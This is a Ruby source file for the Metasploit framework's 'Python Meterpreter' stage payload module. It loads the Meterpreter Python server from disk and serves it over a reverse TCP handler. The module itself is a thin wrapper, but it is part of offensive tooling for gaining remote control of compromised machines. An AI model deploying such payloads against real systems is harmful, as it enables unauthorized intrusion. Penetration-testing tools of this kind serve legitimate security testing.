##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/meterpreter_python'
require 'msf/base/sessions/meterpreter_options'
require 'meterpreter_binaries'


module Metasploit3
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Python Meterpreter',
      'Description'   => 'Run a meterpreter server in Python',
      'Author'        => ['Spencer McIntyre'],
      'Platform'      => 'python',
      'Arch'          => ARCH_PYTHON,
      'License'       => MSF_LICENSE,
      'Session'       => Msf::Sessions::Meterpreter_Python_Python))
  end

  def generate_stage
    file = MeterpreterBinaries.get('meterpreter', 'py')

    met = File.open(file, "rb") {|f|
      f.read(f.stat.size)
    }
    met
  end
end
